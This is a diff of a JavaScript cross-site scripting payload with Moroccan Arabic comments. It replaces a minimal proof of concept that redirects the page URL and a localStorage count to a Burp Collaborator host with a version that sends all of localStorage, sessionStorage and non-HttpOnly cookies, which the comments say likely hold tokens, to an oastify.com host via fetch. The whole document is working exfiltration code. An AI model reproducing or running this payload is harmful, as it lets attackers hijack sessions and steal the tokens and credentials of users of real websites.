@@ -1,9 +1,12 @@
-// كود كيسحب داتا بسيطة ومضمونة باش نتفاداو الـ Block
-var d = {
-    u: window.location.href,
-    s: "VULNERABLE",
-    l: localStorage.length // غير شحال من حاجة كاين فـ LocalStorage باش نبينو الوصول
-};
-var encoded = btoa(JSON.stringify(d));
-// هادي غاتحول الصفحة لـ Collaborator ومعاها الداتا فـ الرابط
-window.location.replace("https://vvuzmzfyyl575ik5pbangyvfg6mxaqyf.oastify.com/?leak=" + encoded);
+(async function() {
+    let data = {
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        localStorage: JSON.stringify(localStorage), // هادي غالبا فيها الـ Tokens
+        sessionStorage: JSON.stringify(sessionStorage),
+        cookie: document.cookie // غايجيب غير اللي ماشي HttpOnly
+    };
+
+    // إرسال البيانات مشفرة لـ Collaborator
+    fetch("https://bq5fhfaet10n0yflkr53beqvbmhd58tx.oastify.com/?leak=" + btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
+})();
